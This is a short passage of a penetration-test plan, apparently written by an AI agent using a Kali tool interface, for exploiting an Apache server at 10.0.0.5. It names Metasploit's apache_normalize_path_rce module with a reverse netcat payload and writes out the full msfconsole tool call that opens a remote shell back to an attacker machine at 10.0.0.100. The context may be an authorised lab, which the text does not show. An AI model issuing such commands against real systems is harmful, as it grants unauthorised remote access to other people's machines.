## Phase 3: Exploitation

### 3.1 Exploit Apache on 10.0.0.5 for initial foothold
Use Metasploit `apache_normalize_path_rce` with payload `cmd/unix/reverse_netcat`. First set up listener on our attack machine (assumed 10.0.0.100, the Kali instance IP).

```mcp__kali-tools__kali_run command="msfconsole -q -x 'use exploit/multi/http/apache_normalize_path_rce; set RHOSTS 10.0.0.5; set RPORT 80; set TARGETURI /cgi-bin/; set PAYLOAD cmd/unix/reverse_netcat; set LHOST 10.0.0.100; set LPORT 4444; run -j; exit' " timeout=30```
